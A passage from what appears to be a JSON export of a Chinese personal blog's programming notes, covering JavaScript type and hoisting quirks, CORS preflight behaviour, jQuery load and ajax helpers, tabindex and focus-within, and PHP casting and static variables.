interface[string,number...])\n\n物件型別\n可以擴充屬性\n\n這邊也有提到重點[前端工程研究：關於 JavaScript 中物件的 valueOf 方法 | The Will Will Web](https://blog.miniasp.com/post/2013/07/11/Front-end-Research-JavaScript-valueOf-method)\n注意 sort 排序竟然是依照 toString 去做(我還沒有遇到這個雷...)\n如何判斷數字排序呢?\n[Array.prototype.sort() - JavaScript | MDN](https://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Reference/Global_Objects/Array/sort)\n\n```js\nvar numbers = [4, 2, 5, 1, 3];\nnumbers.sort(function(a, b) {\n  return a - b;\n});\n```\n\n小記 sort\n\n```\n* 若 compareFunction(a, b) 的回傳值小於 0，則會把 a 排在小於 b 之索引的位置，即 a 排在 b 前面。\n* 若 compareFunction(a, b) 回傳 0，則 a 與 b 皆不會改變彼此的順序，但會與其他全部的元素比較來排序。備註：ECMAscript 標準並不保證這個行為，因此不是所有瀏覽器（如 Mozilla 版本在 2003 以前）都遵守此行為。\n* 若 compareFunction(a, b) 的回傳值大於 0，則會把 b 排在小於 a 之索引的位置，即 b 排在 a 前面。\n* compareFunction(a, b) 在給予一組特定元素 a 及 b 為此函數之兩引數時必須總是回傳相同的值。若回傳值不一致，排序順序則為 undefined。(看不懂這還意義，但好像undefined會移到最後面去)\n[sorting - javascript array.sort with undefined values - Stack Overflow](https://stackoverflow.com/questions/4783242/javascript-array-sort-with-undefined-values)\n```\n\n簡單來說 `a,b`回傳小於 0 的時候，不會調整；反之，`a,b`回傳大於 0 的時候，會調整位置成`b,a`\n\n原始型別包裹物件\n**需要用 new(沒加 new 是轉型)**\n包裹物件可以改裡面屬性\n\n```js\nvar numObj = 17;\nnumObj.xxx = \"2\";\nconsole.log(numObj); // undefined\n```\n\n```js\nvar numObj = new Number(\"17\");\nnumObj.xxx = \"2\";\nconsole.log(numObj); // 2\n```\n\n```js\nvar s = \"Hello\";\ns[0] = \"J\";\nconsole.log();\n```\n\nNumber VS parseInt()\n\nNumber(1)是轉型，這跟 parseInt 很像，但細部內容不一樣\n\n```js\nNumber(\"1abc\"); // NaN\nparseInt(\"1abc\", 10); // 1\n```\n\n之前公司都是用 parseInt(xxx)轉型，公司的老鳥有說過後面要加第二個參數比較好`parseInt(xxx,10)`\n但是轉型的話還是用 Number 比較好\n\n數字運算需要注意的事情\n\n0.1 + 0.2 != 0.3 => true\n\n(0.5).toString(2); // 0.1\n(0.25).toString(2); //0.01\n(0.125).toString(2); //0.001\n\n0.300000000000004\n\n(0.1).toString(2)\n// 0.0001100110011001100110011001100110011001100110011001101\n(0.2).toString(2)\n// 0.001100110011001100110011001100110011001100110011001101\n\n所以正常要做大數字的運算還是需要用到別的寫好的 js\n\nBigInt\n目前只有 chrome 支援\n\nNULL 要注意的事情\n`typeof null // object`\n\nnull 只能跟 null 與 undefined 比較\nNaN 跟任何物件比較都是 false\n\n所以平常`typeof a`這段沒辦法知道 a 變數是不是物件(因為也有可能是 null)\n\n`typeof(a) == 'object' && a!== null`\n完整判斷寫法\n\nundefined IE8 的 bug\n\n```js\nvar undefined = 33;\nconsole.log(window.undefined);\nvar a; // 33 (chrome,firefox,IE>=9是undefined)\n```\n\njQuery 處理 undefined 被修改問題(IE8 的 bug)\n\n```js\n(function(jQuery, undefined) {\n    ...;\n    window.jQuery = window.$ = this;\n})(jQuery);\n```\n\n關於 Date 字串格式 GMT 注意問題\n\n```js\nnew Date(\"2019-01-01\"); // 正規ISO時間，所以是用ISO時間\nnew Date(\"2019/01/01\"); // 非正規ISO時間，所以是用本地時間\n```\n\n[前端工程研究：關於 JavaScript 中 Date 型別的常見地雷與建議作法 | The Will Will Web](https://blog.miniasp.com/post/2016/09/25/JavaScript-Date-usage-in-details)\nJavaScript 物件資料結構\n\n物件回收\n\n當 delete 掉屬性，沒相連跟物件就會被 gc 回收\n以瀏覽器的 js 為例，所有的頭都是 window 物件，當 window 屬性與變數 delete 掉時，將會自動回收\n(這一點感覺就跟 git 很像，只是 git 的 commit 上面沒有 branch 時候之後會自動被回收)\n\nhoisting\n\n會做 hoisting 有\n\n1. function a(){ xxxx}\n2. `var` a = 1;，var 開頭的\n\n但是`var a = function(){xxxx}`，不會做 hoisting\n\n```js\nconsole.log(a); //undefined\nvar a = 1;\n```\n\n程式會變成\n\n```js\nvar a;\nconsole.log(a); //undefined\na = 1;\n```\n\n```js\nfunction a() {\n  var test = function() {\n    console.log(1);\n  };\n  function test() {\n    console.log(2);\n  }\n  test();\n}\n\na();\n```\n\n同等於\n\n```js\nfunction a() {\n  var test;\n  function test() {\n    console.log(2);\n  }\n  test = function() {\n    console.log(1);\n  };\n  test();\n}\n\na();\n```\n\n** let 區域變數在的時候，不會受到 hoisting 影響 **\n\nlet 生命週期是在`{}`裡面，這邊跟 Java 一樣\n在宣告時候之前出現變數，是不允許的，就算上{}有 var 變數，也不會顯示出來(這部份看下面範例，很容易忽略)\n\n```js\nvar a = 1;\nconsole.log(a); // 1\nif (true) {\n  //這邊因為let關係，所以抓不到外面的var，這一點要注意!!!很容易不小心忽略這個特性\n  console.log(a); // can't access lexical declaration\n  let a = 2;\n  console.log(a); // 2\n}\nconsole.log(a); // 1\n```\n\n簡稱 ESM(ECMAScript Module)\n\n不管各模組間寫了幾次 import，只會 import 一次，\n\n> 主模組呼叫 `A.js` `B.js` `C.js` 但是`A.js`有呼叫`B.js`\n> 所以`B.js`指呼叫一次，不會重新載入\n\n可變的寫法\n\n```js\nvar a = [];\nvar b = a;\na.push(1);\nconsole.log(a); //[1]\nconsole.log(b); //[1]\n```\n\n不可變的寫法\n\n```js\nvar a = [];\nvar b = a;\na = [...a, 1]; // 重新宣告變數，陣列內的 ...a 變數指向原本變數的\nconsole.log(a); //[]\nconsole.log(b); //[1]\n```\n\n> 不會改掉記憶體變數，不會影響到別的變數\n\n展開運算子的重要觀念\n\n只有實作迭代器( Iterators ) 的物件，才能使用展開運算子！\n預設所有類陣列物件都可以使用(String, Array, Map, Set, arguments )\\\n預設所有一般物件都不能用，除非有實作迭代器屬性！\n\n[Array.prototype[@@iterator]() - JavaScript | MDN](https://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Reference/Global_Objects/Array/@@iterator)\n\n**容易忽略 for in /for of**\n\nfor in 很久以前 js 就有這個東西\n但這個是 loop 屬性(非值)\n\nfor of 是比較新的語法，\n是 loop 出屬性的值\n\n預設參數 (Default Parameters)\n\n```js\nfunction func(a = 1, b, c = 3) {\n  console.log(a, b, c);\n}\nfunc(\"a\"); //'a',undefined,3\n//這邊自己腦補因為ao物件，所以b才沒有掛掉XD?\n```\n\n```js\nfunction func(a={})\n```\n\n其餘參數 (Rest parameters) ( … )\n\n這玩意可以輕鬆解決 js argument 不能用 array 內建 function\n通過這個可以輕鬆得到 array\n也不用寫出很複雜的程式\n\nES6 Setter 跟 Getter\n\n```js\nclass Rect {\n  constructor(height, width) {\n    this.height = height;\n    this.width = width;\n  }\n  get area() {\n    return this.width * this.height;\n  }\n  set area({ height, width }) {\n    this.height = height;\n    this.width = width;\n  }\n}\nconst square = new Rect(3, 3);\nconsole.log(square.area);\n```\n\n因為 setter 只能放一個參數，放多個以上會跳出這個訊息\nSyntaxError: setter functions must have one argument\n後來 Google 有看到用帶`物件`解決\n[set 方法只能接受一个参数吗？\\_慕课问答](http://www.imooc.com/qadetail/125923)\n但後來突然想到可以用`解構賦值`(Destructuring assignment)\n完美解決這個問題\n\n物件擴展\n\n[對象的擴展 - ECMAScript 6 入門](http://es6.ruanyifeng.com/#docs/object#%E6%89%A9%E5%B1%95%E8%BF%90%E7%AE%97%E7%AC%A6)\n\n當初用這個想說這個可以改成類似 jQuery `$.extends`\n\n找了一下，還真的有\n[[Javascript] 關於 JS 中的淺拷貝和深拷貝 · Larry](http://larry850806.github.io/2016/09/20/shallow-vs-deep-copy/)\n原生寫法\n\n```js\n//jquery\nvar $ = require(\"jquery\");\n\nvar obj1 = {\n  a: 1,\n  b: { f: { g: 1 } },\n  c: [1, 2, 3]\n};\n\nvar obj2 = $.extend(true, {}, obj1);\nconsole.log(obj1.b.f === obj2.b.f); // false\n//assign\nvar obj1 = { a: 10, b: 20, c: 30 };\nvar obj2 = Object.assign({}, obj1);\nobj2.b = 100;\n\nconsole.log(obj1); // { a: 10, b: 20, c: 30 } <-- 沒被改到\nconsole.log(obj2); // { a: 10, b: 100, c: 30 }\n```\n\n```js\nlet aWithDefaults = { x: 1, y: 2, ...a };\n// 等同于\nlet aWithDefaults = Object.assign({}, { x: 1, y: 2 }, a);\n// 等同于\nlet aWithDefaults = Object.assign({ x: 1, y: 2 }, a);\n```\n\n閉包該如何 debug?\n\n[善用 JavaScript 的 debugger 指令讓網頁主動進入中斷點 | The Will Will Web](https://blog.miniasp.com/post/2011/03/17/Using-JavaScript-debugger-statement-enter-breakpoints)\n有空來寫一篇\n\nvar a = function xxx(){\n\n};\n\na 變數是個 function\n但是 console.log(a.name);\n會傳出 xxx\n\n這方便在開發者工具看到哪一個 function 比較吃效能\n所以閉包也能寫`function xxxx()`\n\n本篇可能之後還會調整，目前沒有加小標題\n"},{"title":"CORS實作可能要注意的事情","url":"%2Fblog%2F2019%2F03%2F07%2FCORS%E5%AF%A6%E4%BD%9C%E5%8F%AF%E8%83%BD%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85%2F","content":"\n雖然平常沒有使用 CORS\n但是之前有嘗試了解 CORS 流程原理\n其實瀏覽器會先送 OPTIONS 封包做確認\n有做跨域 header 東西，就會傳送資訊\n今天突然想到傳送兩次\n不是會做兩次程式東西\n我稍微爬了一下文章\n原來我想的問題真的是有這個問題\n\n<!--more-->\n\n看到這篇[CORS 跨域原理浅析 - 知乎](https://zhuanlan.zhihu.com/p/29980092) {% asset_link web.png 備份圖 %}\n裡面有提到很多很細的內容\n我自己也有用簡單 PHP 測試\n\n```php\n<?php\nheader(\"Access-Control-Allow-Origin: *\");\nheader(\"Access-Control-Allow-Headers: *\");\necho 'work!' . PHP_EOL;\n$fp = fopen('test.txt','a+');\nfwrite($fp,'1'. PHP_EOL);\nfclose($fp);\necho 'finial' . PHP_EOL;\n```\n\n簡單用`php -s 0.0.0.0:8888`就可以啟動 php 簡易 server\n在隨便網頁開啟開發者工具，可以`fetch('http://localhost:8888/test.php')`\n可以看`test.txt`有幾個 1\n就知道執行幾次\n\n雖然平常沒甚麼機會使用 CORS，但是還是紀錄這個容易忽略的事情\n話說 Laravel 好像也要注意怎麼修改\n\n相關連結:\n\n- [輕鬆理解 Ajax 與跨來源請求 | TechBridge 技術共筆部落格](https://blog.techbridge.cc/2017/05/20/api-ajax-cors-and-jsonp/)\n- [CORS 跨域原理浅析 - 知乎](https://zhuanlan.zhihu.com/p/29980092)\n- [Laravel 处理 OPTIONS 请求的原理探索及 \b 批量处理方案 - 知乎](https://zhuanlan.zhihu.com/p/33542992)\n- [PHP, Larave, Nginx 設置 Header 允許請求 CORS 的幾種方式 « 關於網路那些事...](https://adon988.logdown.com/posts/7816040-cross-domain-cros-request-issues)\n- [✋🏼🔥 CS Visualized: CORS - DEV Community](https://dev.to/lydiahallie/cs-visualized-cors-5b8h)","tags":["ajax"],"categories":["JavaScript"]},{"title":"jQuery快速方便載入(load)方法","url":"%2Fblog%2F2019%2F03%2F06%2FjQuery%E5%BF%AB%E9%80%9F%E6%96%B9%E4%BE%BF%E8%BC%89%E5%85%A5-load-%E6%96%B9%E6%B3%95%2F","content":"\n之前[Bootstrap 不知道 Modal 一些事筆記 | 程式狂想筆記](https://malagege.github.io/blog/2019/02/19/Bootstrap-%E4%B8%8D%E7%9F%A5%E9%81%93Modal%E4%B8%80%E4%BA%9B%E4%BA%8B%E7%AD%86%E8%A8%98/)有紀錄 jquery load 事情\n但是今天看到還有更神奇的`load`\n以前沒甚麼用到這個函式\n不過覺得在單一網頁不要讓頁面複雜的時候\n可以使用這個方法切出 component\n\n<!--more-->\n\n不過剛開始看 load，想說是單純`.html( data )`載入\n看是看了一下文件，功能比我想像的還多\n超乎我的想像\n所以就心虛寫這篇，虧我寫 jQuery 那麼久都不知道有那麼強大的功能 orz\n\n## 一般使用 load\n\n```js\n$(\"#result\").load(\"ajax/test.html\");\n```\n\n內容會載入到 選擇器上面。\n\n後面可以放 callback，完成的時候會執行\n**備註:此方法會載入 css,js 網頁所有內容**\n\n```js\n$(\"#result\").load(\"ajax/test.html\", function() {\n  alert(\"Load was performed.\");\n});\n```\n\n## load 可以指定網頁內容 #div(Loading Page Fragments)\n\n```js\n$(\"#result\").load(\"ajax/test.html #container\");\n```\n\n這算是我讓我驚訝的功能，而且不會載入 ajax 裡面頁面`html`,`body`,`script`裡面內容\n**備註:此方法會`不會`載入 css,js 網頁所有內容**\n這是出乎意料的事情\n\n可以在 jQuery 官網[jQuery API Documentation](http://api.jquery.com/)\n開起開發者工具來看，\n這段 js,css 都會重新載入\n\n```js\n$(\"body\").load(\"/\");\n```\n\n下面這段 js,css 都不會重新載入\n\n```js\n$(\"body\").load(\"/ #global-nav\");\n```\n\n不管寫在 body 後面，或者`#global-nav`都不會執行\n但對於後面綁定可能真的要寫在 callback 那邊了\n\n## load 可帶參數 post 內容\n\n這個就太簡單了，直接複製官網文件內容\n\nExample: 發送數組形式的 data 參數到服務器。\n\n```js\n$(\"#objectID\").load(\"test.php\", { \"choices[]\": [\"Jon\", \"Susan\"] });\n```\n\nExample: Same as above, but will POST the additional parameters to the server and a callback that is executed when the server is finished responding.\n\n```js\n$(\"#feeds\").load(\"feeds.php\", { limit: 25 }, function() {\n  alert(\"The last 25 entries in the feed have been loaded\");\n});\n```\n\n[.load() : 从服务器载入数据并且将返回的 HTML 代码并插入至 匹配的元素 中。 - jQuery API 中文文档 | jQuery 中文网](https://www.jquery123.com/load/)\n","tags":["load"],"categories":["JavaScript"]},{"title":"jQuery ajax的beforeSend妙用","url":"%2Fblog%2F2019%2F03%2F05%2FjQuery-ajax%E7%9A%84beforeSend%E5%A6%99%E7%94%A8%2F","content":"\n最近看到 jQuery 有`beforeSend`\n看到這個可以做驗證上面\n或著動態載入特效\n先來筆記，感覺很容易忘記\n\n<!--more-->\n\n```js\n<form method=\"post\" action=\"test.php\">\nAA：<input type=\"text\" name=\"aa\" onkeypress=\"if (event.keyCode == 13) {return false;}\">\n<input type=\"radio\" name=\"cc\">CC\n</form>\n```\n\n[XYZ 的筆記本: HTML form 只有一個 text input 時，在 input 上按 enter 會自動送出表單](https://xyz.cinc.biz/2016/07/form-input-enter-auto-submit.html)\n之前公司也是用這個解法\n但是我覺得這個方法寫在 html 真的很長\n有想到一個方法\n\n```js\n$(\"input\").on(\"keypress\", e => e.preventDefault());\n```\n\najax 搭配 submit 事件，實做 ajax 後，下面回傳 false，所以表單不會送出去\n`beforeSend`可以做驗證動作\n這時候還會有 input 按 Enter 會送出的問題\n\nEX:\n\n```js\n$('form').on('submit',function(){\n\n  $.ajax({\n    url: '.',\n    data:{\n      ...\n    },\n    beforeSend: function(){\n      ...\n    }\n  })\n  return false;\n});\n```\n\n由於暫存筆記有記錄 jquery.form.js\n但是一直沒有記錄，趁著這個時間趕快記錄\n\n```js\n$(\"#myForm\").ajaxForm(function() {\n  $(\"#output1\")\n    .html(\"提交成功！欢迎下次再来！\")\n    .show();\n});\n\n$(\"#myForm2\").submit(function() {\n  $(this).ajaxSubmit(function() {\n    $(\"#output2\")\n      .html(\"提交成功！欢迎下次再来！\")\n      .show();\n  });\n  return false; //阻止表单默认提交\n});\n```\n\n[淺談 jquery.form.js 的 ajaxSubmit 和 ajaxForm 的使用 | 程式前沿](https://codertw.com/%E5%89%8D%E7%AB%AF%E9%96%8B%E7%99%BC/260779/)\n\n簡單來說`ajaxForm`和`ajaxSubmit`看起來很像\n但簡單來說`ajaxForm`是拿當下 form 做 submit 時候，不會送出去，會做 ajax\n這就是跟一般 ajax 差別\n\n`ajaxSubmit`是當下呼叫拿當下 form 做 ajax 動作\n所以上面範例是寫在`.submit()`裡面\n\najax 拿來放在 submit 可以簡單做到表單綁定效果\n\n以下是筆記暫存就放在下面\n怕沒有甚麼機會寫到\n\n```\n# JQuery Form Validate\n[使用jQuery.form庫中ajaxSubmit提交表單時遇到的一些問題 - 掃文資訊](https://hk.saowen.com/a/e36ca7b7b772fcc2699400c165fb9129964364e45217a35412ca0cdb21b37b63)\nhttps://jqueryvalidation.org/documentation/\nhttp://formvalidation.io/examples/\n\n[Bootstrap 表單驗證formValidation 之表單動態驗證 - CSDN博客](https://blog.csdn.net/u012123026/article/details/53288641)\n[Bootstrap 表单验证formValidation 之表单动态添加元素之后再次验证 - CSDN博客](https://blog.csdn.net/weixin_40475396/article/details/79879094)\n\n\njQuery Form\n[jQuery Form Plugin中AjaxForm与AjaxSubmit的区别-飘一代-51CTO博客](http://blog.51cto.com/fluagen/393134)\n把傳統表單迅速套成ajaxForm，submit可以做成ajax動作\n\n# waitme\n\n# ajaxsuccess\n[Ajax-Global Ajax Event Handlers .ajaxComplete()、.ajaxError()、.ajaxSend()、.ajaxStart()、.ajaxStop()、.ajaxSuccess() | 阿沙布魯 - 點部落](https://dotblogs.com.tw/brooke/2016/07/10/142933)\n\n可搭配waitme實做\n```\n\n參考來源:\n\n- [[程式][JQuery] 讓 AJAX 運作的時候，跳出 loding 的訊息。－Part 1 @ 四處流浪的阿基。I am Vagrant Walker :: 痞客邦 ::](https://expect7.pixnet.net/blog/post/39829979-%5B%E7%A8%8B%E5%BC%8F%5D%5Bjquery%5D-%E8%AE%93ajax%E9%81%8B%E4%BD%9C%E7%9A%84%E6%99%82%E5%80%99%EF%BC%8C%E8%B7%B3%E5%87%BAloding%E7%9A%84%E8%A8%8A)\n- [jquery-form/form: jQuery Form Plugin](https://github.com/jquery-form/form)\n- [jQuery Form Plugin 中 AjaxForm 与 AjaxSubmit 的区别-飘一代-51CTO 博客](https://blog.51cto.com/fluagen/393134)\n- [jQuery form 插件的使用--ajaxForm()和 ajaxSubmit()的可选参数项对象 - souvc - 博客园](https://www.cnblogs.com/liuhongfeng/p/5150389.html)\n- [防止 ENTER 鍵直接 SUBMIT- 藍色小舖 BlueShop](http://www.blueshop.com.tw/board/FUM20041006152641OLG/BRD20060619104902G2O.html)\n- [HTML 防止 input 回车提交表单 - 李刚的学习专栏 - CSDN 博客](https://blog.csdn.net/ligang2585116/article/details/44699567)\n- [XYZ 的筆記本: HTML form 只有一個 text input 時，在 input 上按 enter 會自動送出表單](https://xyz.cinc.biz/2016/07/form-input-enter-auto-submit.html)\n- [Press Enter to Submit 背后的那些事 « David Chen's Blog](http://david-chen-blog.logdown.com/posts/177766-how-forms-submit-when-pressing-enter)\n- [JS Bin - JS Bin](https://jsbin.com/namefaqija/edit?html,css,js,output)\n","tags":["jquery"],"categories":["JavaScript"]},{"title":"神奇的選擇器 :focus-within","url":"%2Fblog%2F2019%2F02%2F28%2F%E7%A5%9E%E5%A5%87%E7%9A%84%E9%81%B8%E6%93%87%E5%99%A8-focus-within%2F","content":"\n這篇簡單記錄`focus-within`\n簡單記錄一下這邊\n主要會監聽子層 focus，子層會冒泡給上層\n上層會觸發 focus-within\n簡單玩一下會比較了解[JS Bin - JS Bin](https://jsbin.com/yozesawato/edit?html,css,output)\n\n更多內容可以看 [神奇的選擇器 :focus-within - WEB 前端 - 伯樂在線](http://web.jobbole.com/95025/)\n","tags":["css"],"categories":["CSS"]},{"title":"如何讓div有focus動作(tabindex)","url":"%2Fblog%2F2019%2F02%2F27%2F%E5%A6%82%E4%BD%95%E8%AE%93div%E6%9C%89focus%E5%8B%95%E4%BD%9C-tabindex%2F","content":"\n正常 focus 只有 input,textarea,button 等等\n平常 div 是沒有 focus，但最近看`focus-within`有一個案例\n[神奇的选择器 :focus-within - WEB 前端 - 伯乐在线](http://web.jobbole.com/95025/)\n[Off-screen nav with :focus-within [PURE CSS]](https://codepen.io/dannievinther/pen/NvZjvz)\n查了一下是 tabindex 關係\n由於這個很少用，所以還是記錄一下。\n\n<!--more-->\n\n[说说 tabindex 的那些事儿 | bubkoo](http://bubkoo.com/2015/02/01/using-the-tabindex-attribute/) {% asset_link web.png 備份圖 %}\n\n> 定義和用法\n> tabindex 屬性規定元素的 tab 鍵控制次序（當 tab 鍵用於導航時）。\n> 提示和註釋\n> 註釋：以下元素支持 tabindex 屬性：`<a>, <area>, <button>, <input>, <object>, <select> 以及 <textarea>`。\n\n[HTML tabindex 属性](http://www.w3school.com.cn/tags/att_standard_tabindex.asp)\n[(译)如何让 div 可以有 focus 事件?](https://www.douban.com/note/238463483/)\ndiv 或 span 設定 tabindex 就會有 focus\n\n最後剛好最近在查有沒有按鍵盤切換方向鍵移動不同 table 的 input\n剛好有看到\n[garygreen/arrow-table: Navigate HTML tables with arrow keys (jQuery plugin)](https://github.com/garygreen/arrow-table)\n[jQuery-利用上下左右鍵移動輸入焦點-黑暗執行緒](https://blog.darkthread.net/blog/jquery-arrow-keys-focus-moving)\n由於是上面是用 tabindex 去實作\n\n真想把他改成文字用左再調整更換 input 位置\n[javascript 对象之 selectionStart selectionEnd - 选择了就坚持 - 博客园](https://www.cnblogs.com/perseverancevictory/p/3665814.html)\n[Cross browser Javascript code to get/set caret position in textarea/input](https://www.vishalon.net/blog/javascript-getting-and-setting-caret-position-in-textarea)\n\n```js\nfunction getCaretPosition(ctrl) {\n  // IE < 9 Support\n  if (document.selection) {\n    ctrl.focus();\n    var range = document.selection.createRange();\n    var rangelen = range.text.length;\n    range.moveStart(\"character\", -ctrl.value.length);\n    var start = range.text.length - rangelen;\n    return { start: start, end: start + rangelen };\n  }\n  // IE >=9 and other browsers\n  else if (ctrl.selectionStart || ctrl.selectionStart == \"0\") {\n    return { start: ctrl.selectionStart, end: ctrl.selectionEnd };\n  } else {\n    return { start: 0, end: 0 };\n  }\n}\n\nfunction setCaretPosition(ctrl, start, end) {\n  // IE >= 9 and other browsers\n  if (ctrl.setSelectionRange) {\n    ctrl.focus();\n    ctrl.setSelectionRange(start, end);\n  }\n  // IE < 9\n  else if (ctrl.createTextRange) {\n    var range = ctrl.createTextRange();\n    range.collapse(true);\n    range.moveEnd(\"character\", end);\n    range.moveStart(\"character\", start);\n    range.select();\n  }\n}\n```\n\n先留著...以後再修改\n","tags":["tabindex"],"categories":["HTML"]},{"title":"超連結href=#和href=javascript:void(0)差別 & href和src不一樣的地方","url":"%2Fblog%2F2019%2F02%2F27%2F%E8%B6%85%E9%80%A3%E7%B5%90href-%E5%92%8Chref-javascript-void-0-%E5%B7%AE%E5%88%A5-href%E5%92%8Csrc%E4%B8%8D%E4%B8%80%E6%A8%A3%E7%9A%84%E5%9C%B0%E6%96%B9%2F","content":"\n之前很常看到網頁做不做跳頁超連結都用`href=\"#\"`\n也有看過更早的程式用`javascript:void(0);`\n但也沒有深入這兩個的差別\n當然知道`#`有錨點功能，但說真的也不知道這樣用會有什麼缺點\n[神奇的 html 錨點，讓你的網頁在內部自由的跳轉 - 每日頭條](https://kknews.cc/zh-tw/tech/ena88ry.html)\n之前有看過一篇[在 Angular 套版時應注意多層次選單超連結的使用 | The Will Will Web](https://blog.miniasp.com/post/2018/09/22/Angular-template-with-hash-link-problem)\n今天就小記一下，不然怕之忘了很難找\n\n<!--more-->\n\n## href,javascript:void(0),javascript:;\n\n> 我們一般比較常見的寫法有幾種：\n>\n> - 直接使用 # 當作超連結\n>   這種技巧對於靜態版型還可行，許多網頁設計師也很習慣這樣寫，但是當使用者點擊連結後，卻會在目前網址後方加上一個 # 符號。一來，我個人相當不喜歡這種作法，因為網址會發生改變；二來，這種寫法會讓 SPA (單一頁面應用程式) 的路由發生異常，所以應該避免。\n> - 使用特殊的 javascript:void(0) 當作超連結\n>   這種寫法通常是前端工程師以及對 UX 特別要求的設計師愛用，原因無他，就是網址列不會出現怪怪的 # 符號。這種寫法同時也對 SPA 網頁應用程式相當友善，所以推薦使用。但唯一的缺點，就是比 # 多打太多字了！\n> - 使用特殊的 javascript:; 當作超連結\n>   這種寫法跟 javascript:void(0) 如出一轍，但硬是少打了 6 個字元，如果學會他，你這輩子可能有機會打超過 1000 次這種連結，就可以少打 6000 個按鍵，不無小補啦。\n\n以上來自:[在 Angular 套版時應注意多層次選單超連結的使用 | The Will Will Web](https://blog.miniasp.com/post/2018/09/22/Angular-template-with-hash-link-problem)\n\n## src href\n\n這之前也有看過類似文章\n但今天忘了，剛好又看到有人討論這個問題\n當出學 HTML 也是用記得，沒有想到這個問題\n\n[六角學院 - 學員社團](https://www.facebook.com/groups/110635703123103/permalink/361861428000528/?comment_id=361918307994840&comment_tracking=%7B%22tn%22%3A%22R%22%7D)\n[html - Difference between SRC and HREF - Stack Overflow](https://stackoverflow.com/questions/3395359/difference-between-src-and-href?fbclid=IwAR19QTM94zHMAXPawqr9i_sWKF7-UXD6b9WWRf-aLNorxSAWpctLPz2B2mc)\n\n> 另外依據文內資訊，在載入頁面時，此兩者個運作行為會有差別。\n> 具體而言，瀏覽器會依據 html 的內容依序載入元素，由於 src 本身即為元素之一，因此瀏覽器會等 src 的內容完整抓取之後才繼續載入後續元素。然而 href 只是連結，瀏覽器並不會去載入 href 的任何內容。\n> 這就是爲什麼 CSS 是用 href，但是 javascript 卻是用 src\n","tags":["src"],"categories":["HTML"]},{"title":"PHP intval跟(int)強制轉型差別","url":"%2Fblog%2F2019%2F02%2F24%2FPHP-intval%E8%B7%9F-int-%E5%BC%B7%E5%88%B6%E8%BD%89%E5%9E%8B%E5%B7%AE%E5%88%A5%2F","content":"\n最近寫 PHP 使用 intval()做字串轉數值\n之前有看到一篇文章，PHP 也有轉型`(int)'134'`\n這兩個有沒有差別，當下我也不知道\n只是`intval()`看起來很順眼\n所以選擇這個方法\n但我最近在 Google 搜尋\n發現我錯了\n\n<!--more-->\n\n```\nFor years I've been using intval($var) for being sure something is an integer, and sometimes using (int)$var to cast it into an integer, which essentially does the same thing — learn what casting is.\n\nI'm here to tell you that unless you require the second parameter of intval(), which changes the base, then you should be casting instead.\n\nIn the case of casting int, it's about 300% or 3 times as fast as using intval(), and if you use it a lot like I do, for example in setting the correct type/checking for SQL queries, then it's time to switch. I know I am.\n```\n\n[Casting int faster than intval in PHP – Tony Showoff](http://tonyshowoff.com/articles/casting-int-faster-than-intval-in-php/)\n這篇文獻能看到 intval 是比較吃效能的\n\n那我就想`intval()`有何作用?\n[php - Is there any particular difference between intval and casting to int - `(int) X`? - Stack Overflow](https://stackoverflow.com/questions/1912599/is-there-any-particular-difference-between-intval-and-casting-to-int-int-x)\n原來主要可以算 2 進位和 8 進位\n\n現在仔細想想，JavaScript 也有一個`parseInt(xxx)`\n這個第二個參數沒帶，第一個參數 0 開頭是`8位元算`\n這個我曾經踩過，因為 uid 是 0 開頭，剛好要轉數字，跑出一個錯誤訊息，後來才知道轉成 8 位元\n有聽到資深的前輩說後面第二個參數還是乖乖加個`10`會比較好\n\n參考來源\n\n- [php - Is there any particular difference between intval and casting to int - `(int) X`? - Stack Overflow](https://stackoverflow.com/questions/1912599/is-there-any-particular-difference-between-intval-and-casting-to-int-int-x)\n- [Casting int faster than intval in PHP – Tony Showoff](http://tonyshowoff.com/articles/casting-int-faster-than-intval-in-php/)\n- [Php string cast vs strval function which should I use? - Stack Overflow](https://stackoverflow.com/questions/7371991/php-string-cast-vs-strval-function-which-should-i-use)\n- [php - Is there any particular difference between intval and casting to int - `(int) X`? - Stack Overflow](https://stackoverflow.com/questions/1912599/is-there-any-particular-difference-between-intval-and-casting-to-int-int-x)\n","tags":["php"],"categories":["PHP"]},{"title":"PHP - static那些事","url":"%2Fblog%2F2019%2F02%2F20%2FPHP-static%E9%82%A3%E4%BA%9B%E4%BA%8B%2F","content":"\n最近使用在看`static`部份\n平常很少用，過很久可能就會忘了這是什麼東西\n但 global 部份應該不再記錄\n[PHP 有關參照(Reference)的那些事 | 程式狂想筆記](https://malagege.github.io/blog/2019/01/28/PHP%E6%9C%89%E9%97%9C%E5%8F%83%E7%85%A7-Reference-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/)\n這裡面有簡單提到\n\n<!--more-->\n\n## static 用在變數\n\nstatic 通常是寫在 function 裡面\n但寫在 function 外面也不會報錯\n\n一般沒有 static\n\n```php\n<?php\nfunction test()\n{\n    $a = 0;\n    echo $a;\n    $a++;\n}\ntest(); //0\ntest(); //0\ntest(); //0\n?>\n```\n\nstatic 後\n\n```php\n<?php\nfunction test()\n{\n    static $a = 0;\n    echo $a;\n    $a++;\n}\ntest(); //1\ntest(); //2\ntest(); //3\n?>\n```\n\n### 遞迴 function static 變數\n\n先看官網範例，可以用在遞迴，但後面注意`$count--`的關係\n所以跑完`$count`變數會歸 0\n但是沒有寫`$count--`不會\n\n```php\n\n<?php\nfunction test()\n{\n    static $count = 0;\n\n    $count++;\n    echo $count;\n    if ($count < 10) {\n        test();\n    }\n    $count--;\n}\n\n\ntest(); // 12345678910\necho PHP_EOL;\ntest(); // 12345678910\n```\n\n### 定義 static 變數限制\n\n簡單看官往範例，其實也滿好懂得\n用運算式再次進入 function 怎麼知道初始值\n\n```php\n<?php\nfunction foo(){\n    static $int = 0;          // correct\n    static $int = 1+2;        // correct (as of PHP 5.6)\n    static $int = sqrt(121);  // wrong  (as it is a function)\n\n    $int++;\n    echo $int;\n}\n?>\n\n```\n\n靜態聲明是在編譯時解析的。\n[深入理解 PHP 代码的执行的过程 - risingsun001 的专栏 - CSDN 博客](https://blog.csdn.net/risingsun001/article/details/22888861)\n這一快我不是很了解\n\n## static 用在 Object Function\n\n### self\n\n這邊先介紹 Object 會用到的 self\n\nself:: 或者 \\_\\_CLASS\\_\\_，也可以用 get_class()呼叫\n簡單說明一下，這邊跟 Java 的 this 很像\n當是參照當前放置的 class 位置\n可以看一下[java method 類別成員(class member) 